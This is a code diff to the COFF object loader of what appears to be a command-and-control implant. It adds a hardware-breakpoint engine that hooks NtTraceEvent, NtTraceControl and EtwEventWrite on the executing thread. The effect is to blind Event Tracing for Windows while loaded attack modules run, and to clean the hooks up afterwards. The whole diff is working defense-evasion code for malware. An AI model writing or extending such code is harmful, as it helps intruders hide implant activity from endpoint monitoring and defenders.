@@ -3,6 +3,8 @@
 #include <core/Win32.h>
 #include <core/MiniStd.h>
 #include <core/Package.h>
+#include <core/HwBpEngine.h>
+#include <core/HwBpExceptions.h>
 #include <core/CoffeeLdr.h>
 #include <core/ObjectApi.h>
 #include <inject/InjectUtil.h>
@@ -674,6 +676,9 @@ VOID CoffeeLdr( PCHAR EntryName, PVOID CoffeeData, PVOID ArgData, SIZE_T ArgSize
     PCOFFEE Coffee   = NULL;
     PVOID   NextBase = NULL;
     BOOL    Success  = FALSE;
+#if _WIN64
+    BOOL    CoffeeCreatedHwBp = FALSE;
+#endif
 
     PRINTF( "[EntryName: %s] [CoffeeData: %p] [ArgData: %p] [ArgSize: %ld]\n", EntryName, CoffeeData, ArgData, ArgSize )
 
@@ -767,7 +772,41 @@ VOID CoffeeLdr( PCHAR EntryName, PVOID CoffeeData, PVOID ArgData, SIZE_T ArgSize
         goto END;
     }
 
+#if _WIN64
+    if ( Instance->Config.Implant.AmsiEtwPatch == AMSIETW_PATCH_HWBP )
+    {
+        DWORD CoffeeTid = (DWORD)(ULONG_PTR)NtCurrentTeb()->ClientId.UniqueThread;
+
+        /* init engine if not already active */
+        if ( ! Instance->HwBpEngine ) {
+            if ( NT_SUCCESS( HwBpEngineInit( NULL, NULL ) ) ) {
+                CoffeeCreatedHwBp = TRUE;
+            }
+        }
+
+        if ( Instance->HwBpEngine )
+        {
+            if ( Instance->Win32.NtTraceEvent ) {
+                HwBpEngineAdd( NULL, CoffeeTid, Instance->Win32.NtTraceEvent, HwBpExNtTraceEvent, 0xFF );
+            }
+            if ( Instance->Win32.NtTraceControl ) {
+                HwBpEngineAdd( NULL, CoffeeTid, Instance->Win32.NtTraceControl, HwBpExNtTraceControl, 0xFF );
+            }
+            if ( Instance->Win32.EtwEventWrite ) {
+                HwBpEngineAdd( NULL, CoffeeTid, Instance->Win32.EtwEventWrite, HwBpExEtwEventWrite, 0xFF );
+            }
+        }
+    }
+#endif
+
     Success = CoffeeExecuteFunction( Coffee, EntryName, ArgData, ArgSize, RequestID );
+
+#if _WIN64
+    /* cleanup ETW bypass only if we created the engine */
+    if ( CoffeeCreatedHwBp && Instance->HwBpEngine ) {
+        HwBpEngineDestroy( NULL );
+    }
+#endif
 
 END:
     PUTS( "[*] Cleanup memory" );
